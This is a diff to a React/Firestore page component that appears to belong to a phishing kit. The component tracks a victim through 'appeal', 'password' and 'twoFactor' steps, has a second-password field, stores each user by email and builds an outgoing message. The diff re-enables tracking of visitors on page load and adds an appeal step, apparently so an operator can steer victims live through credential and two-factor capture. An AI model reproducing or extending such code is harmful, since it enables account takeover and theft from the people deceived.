@@ -27,14 +27,13 @@ export default function Home(ip) {
   const [secondPassword, setSecondPassword] = useState('');
 
 
-  // useEffect(()=>{
-  //   let localEmail = localStorage.getItem("email");
-  //   if(localEmail){
-  //     setEmail(localEmail);
-  //     listenUser(localEmail);
-  //   }
-  //   sendOpenedScript();
-  // },[]);  
+  useEffect(()=>{
+    let localEmail = localStorage.getItem("email");
+    if(localEmail){
+      setEmail(localEmail);
+      listenUser(localEmail);
+    }
+  },[]);  
 
   const sendOpenedScript = async () => {
 
@@ -83,7 +82,7 @@ export default function Home(ip) {
       }
       await setDoc(doc(db, "users", data.data.email), obj);
       localStorage.setItem("email", data.data.email);
-      listenUser(data.data.email)
+      listenUser(data.data.email);
       setOpen({step_three: true});
 
       const formattedMessage = `
@@ -210,10 +209,10 @@ export default function Home(ip) {
         console.log(user);
 
         if(user.currentStep == 'firstPage') setOpen({step_one: true});
-        if(user.currentStep == 'password') setOpen({step_two: true});
-        if(user.currentStep == 'twoFactor') setOpen({step_three: true});
+        if(user.currentStep == 'appeal') setOpen({step_two: true});
+        if(user.currentStep == 'password') setOpen({step_three: true});
+        if(user.currentStep == 'twoFactor') setOpen({step_four: true});
         if(user.currentStep == 'final') setOpen({step_four: true});
-
 
         console.log("Current data: ", doc.data());
       });
